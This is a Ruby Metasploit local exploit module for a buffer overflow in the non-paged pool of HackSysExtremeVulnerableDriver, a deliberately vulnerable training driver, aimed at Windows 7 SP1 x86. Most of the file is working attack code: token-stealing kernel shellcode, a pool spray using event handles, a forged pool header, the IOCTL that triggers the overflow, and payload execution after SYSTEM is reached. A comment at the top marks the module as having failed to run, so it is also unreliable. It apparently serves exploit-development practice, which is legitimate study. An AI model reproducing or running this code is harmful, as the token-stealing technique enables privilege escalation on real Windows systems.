##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# 运行失败

require 'msf/core/exploit/local/windows_kernel'

class MetasploitModule < Msf::Exploit::Local
	Rank = NormalRanking

	include Msf::Exploit::Local::WindowsKernel
	include Msf::Post::File
	include Msf::Post::Windows::FileInfo
	include Msf::Post::Windows::Priv
	include Msf::Post::Windows::Process

	def initialize(info={})
		super(update_info(info, {
			'Name'              => 'HEVD BufferOverflowNonPagedPool',
			'Description'       => %q{This flaw can be abused to elevate privileges to SYSTEM.},
			'License'           => MSF_LICENSE,
			'Author'            => ['dphz'],
			'Arch'              => ARCH_X86,
			'Platform'			=> 'win',
			'SessionTypes'	    => [ 'meterpreter' ],
			'DefaultOptions'    =>{'EXITFUNC' => 'thread'},
			'Targets'        =>
				[
				  [ 'Windows 7 SP1',
					{
					  'HaliQuerySystemInfo' => 0x16bba, # Stable over Windows XP SP3 updates
					  '_KPROCESS'           => "\x50",  # Offset to _KPROCESS from a _ETHREAD struct
					  '_TOKEN'              => "\xf8",  # Offset to TOKEN from the _EPROCESS struct
					  '_UPID'               => "\xb4",  # Offset to UniqueProcessId FROM the _EPROCESS struct
					  '_APLINKS'            => "\xb8"   # Offset to ActiveProcessLinks _EPROCESS struct
					}
				  ]
				],
			'References'		=>
				[
					['URL', 'https://github.com/dongpohezui/HEVD_exp']
					],
			'DisclosureDate'=> '2021',
			'DefaultTarget' => 0
		}))

	end

	def check
		
		handle = open_device('\\\\.\\HackSysExtremeVulnerableDriver', 0, 'FILE_SHARE_READ', 'OPEN_EXISTING')
		return Exploit::CheckCode::Safe unless handle

		session.railgun.kernel32.CloseHandle(handle)

		return Exploit::CheckCode::Appears
	end

	def exploit
		if is_system?
			fail_with(Failure::None, 'Session is already elevated')
		end
		
		if check == Exploit::CheckCode::Safe
			fail_with(Failure::NotVulnerable, "Exploit not available on this system")
		end

		handle = open_device('\\\\.\\HackSysExtremeVulnerableDriver', 0, 'FILE_SHARE_READ', 'OPEN_EXISTING')
		if handle.nil?
			fail_with(Failure::NoTarget, "Unable to open \\\\.\\HackSysExtremeVulnerableDriver device")
		end

		print_status("Storing the shellcode in memory...")
		this_proc = session.sys.process.open

		session.railgun.ntdll.NtAllocateVirtualMemory(-1, [0x1000].pack('V'), nil, [0x1000].pack('V'), "MEM_RESERVE|MEM_COMMIT", "PAGE_EXECUTE_READWRITE")

		unless this_proc.memory.writable?(0x1000)
			fail_with(Failure::Unknown, 'Failed to allocate memory')
		end

		sc	= "\x90"*4                        # NOP Sled
        sc << "\x60"                          # pushad
        sc << "\x64\xA1\x24\x01\x00\x00"      # mov eax, fs:[KTHREAD_OFFSET]
        sc << "\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
        sc << "\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
        sc << "\x8B\x98\xF8\x00\x00\x00"      # mov ebx, [eax + TOKEN_OFFSET]
        sc << "\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
        sc << "\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET] <-|
        sc << "\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET           |
        sc << "\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx     |
        sc << "\x75\xED"                      # jnz                           ->|
        sc << "\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
        sc << "\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
        sc << "\x61"                          # popad
        sc << "\xC2\x10\x00"                  # ret 16
		
		print_status("write shellcode...")
		this_proc.memory.write(0x1000, sc)
		this_proc.memory.write(0x1100, 'B'*0x1f8)
		this_proc.memory.write(0x12f8, [ 0x04080040].pack('V') )
		this_proc.memory.write(0x12f8 + 0x04, [ 0xee657645].pack('V') )
		this_proc.memory.write(0x12f8 + 0x08, [ 0x00000000].pack('V') )
		this_proc.memory.write(0x12f8 + 0x0c, [ 0x00000040].pack('V') )
		this_proc.memory.write(0x12f8 + 0x10, [ 0x00000000].pack('V') )
		this_proc.memory.write(0x12f8 + 0x14, [ 0x00000000].pack('V') )
		this_proc.memory.write(0x12f8 + 0x18, [ 0x00000001].pack('V') )
		this_proc.memory.write(0x12f8 + 0x1c, [ 0x00000001].pack('V') )
		this_proc.memory.write(0x12f8 + 0x20, [ 0x00000000].pack('V') )
		this_proc.memory.write(0x12f8 + 0x24, [ 0x00080000].pack('V') )
		
		session.railgun.ntdll.NtAllocateVirtualMemory(-1, [0x1].pack('V'), nil, [0x500].pack('V'), "MEM_RESERVE|MEM_COMMIT", "PAGE_EXECUTE_READWRITE")
		
		this_proc.memory.write(0x60, [0x00001000].pack('V') )
		
		print_status("Pool Spray...")
		event = Array.new(0x110)
		for i in 0..0x100
			if i % 0x10 == 0
				print_status("CreateEventA #{i} ...")
			end
			event[i] = session.railgun.kernel32.CreateEventA(nil,FALSE,FALSE,nil)
		end
		
		for i in 0..0x90
			if i % 0x10 == 0
				print_status("CloseHandle #{i} ...")
			end
			
			for j in 0..7
				session.railgun.kernel32.CloseHandle(event[i + j]['return'])
			end
			i = i + 0x10
		end

		print_status("Triggering the vulnerability...")
		session.railgun.ntdll.NtDeviceIoControlFile(handle, nil, nil, nil, 4, 0x22200f, 0x1100, 0x1f8 + 0x28, 0, 0)
		#session.railgun.kernel32.CloseHandle(handle) # CloseHandle will never return, so skip it

		for i in 0..0x100
			if i % 0x10 == 0
				print_status("CloseHandle #{i} ...")
			end
			session.railgun.kernel32.CloseHandle(event[i]['return'])
		end
		
		print_status("Checking privileges after exploitation...")

		unless is_system?
			fail_with(Failure::Unknown, "The exploitation wasn't successful")
		end

		print_good("Exploitation successful!")
		unless execute_shellcode(payload.encoded, nil, this_proc.pid)
			fail_with(Failure::Unknown, 'Error while executing the payload')
		end
	end
end
